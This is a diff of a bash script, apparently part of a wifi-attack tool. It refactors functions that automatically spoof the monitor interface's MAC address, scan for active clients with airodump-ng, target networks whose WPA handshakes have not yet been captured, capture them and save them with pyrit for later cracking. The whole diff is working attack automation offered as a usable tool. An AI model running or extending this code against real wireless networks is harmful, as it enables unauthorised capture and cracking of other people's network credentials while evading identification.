@@ -13,7 +13,7 @@
 ## GNU General Public License at (http://www.gnu.org/licenses/) for
 ## more details.
 
-fautobot()																#Automagically find active clients and collect new handshakes
+fbotstart()																#Automagically find active clients and collect new handshakes
 {	
 	ifconfig mon0 down
 	macchanger -a mon0
@@ -41,12 +41,17 @@ fautobot()																#Automagically find active clients and collect new han
 					$COLOR 2;echo " [*] We just got this handshake! [*] ";$COLOR 9
 			fi	
 	fi
-	gnome-terminal --geometry=130x50+0+320 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
+	gnome-terminal --geometry=130x80+0+0 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
 	DONE=""
 	LNUM=0
 	fhunt
+}
+
+fautocap()
+{
 	killall airodump-ng
 	rm -rf $HOME/tmp*
+	sleep 0.2
 	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
 	DONE=""
 	DECNT=0
@@ -70,7 +75,7 @@ fautobot()																#Automagically find active clients and collect new han
 			if [ $DECNT -gt 5 ] 2> /dev/null
 				then
 					killall airodump-ng
-					fautobot
+					fbotstart
 			fi
 			if [ $GDONE = "1" ] 2> /dev/null
 				then
@@ -95,7 +100,7 @@ fautobot()																#Automagically find active clients and collect new han
 	pyrit -r $HOME/tmp1-01.cap -o "$HOME/Desktop/cap/handshakes/$ESSID-$DATE.cap" strip | grep 'New pcap-file'
 	rm -rf $HOME/tmp*
 	sleep 3
-	fautobot
+	fbotstart
 }		
 
 fhunt()																	#find active clients that havn't been handshaked yet for autobot
@@ -110,16 +115,7 @@ fhunt()																	#find active clients that havn't been handshaked yet for
 					sleep 1
 					fhunt
 			fi
-			cat $HOME/tmp-01.csv | grep Station -A 20 | grep ":" | cut -d ',' -f 4,6 | tr -d '(not associated)' > $HOME/tmp4
-			while read LINE
-				do
-					if [ $(echo $LINE | cut -d ',' -f 2) -z ] 2> /dev/null
-						then
-							A=1
-						else
-							echo "$LINE" >> $HOME/tmp5
-					fi
-				done < $HOME/tmp4
+			fpower
 			BSSIDL="$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -uR | head -n 1)"
 			if [ $BSSIDL -z ] 2> /dev/null
 				then
@@ -156,6 +152,7 @@ fhunt()																	#find active clients that havn't been handshaked yet for
 								then
 									DONET=1
 									$COLOR 1;echo " [*] We need this handshake [*] ";$COLOR 9
+									fautocap
 								else
 									$COLOR 2;echo " [*] We already have this handshake [*] ";$COLOR 9
 									LASTBSSID=$BSSID
@@ -179,6 +176,20 @@ fhunt()																	#find active clients that havn't been handshaked yet for
 			fi
 			LASTBSSID=$BSSID
 		done
+}
+
+fpower()
+{
+	cat $HOME/tmp-01.csv | grep Station -A 20 | grep ":" | cut -d ',' -f 4,6 | tr -d '(not associated)' > $HOME/tmp4
+	while read LINE
+		do
+			if [ $(echo $LINE | cut -d ',' -f 2) -z ] 2> /dev/null
+				then
+					A=1
+				else
+					echo "$LINE" >> $HOME/tmp5
+			fi
+		done < $HOME/tmp4
 }
 
 fanalyze()																#Analyze handshakes
@@ -502,7 +513,7 @@ fstart()																#Startup
 	
 	if [ $AUTO = "Y" ] 2> /dev/null
 		then
-			fautobot
+			fbotstart
 	fi
 	
 	if [ $DO = "L" ] 2> /dev/null
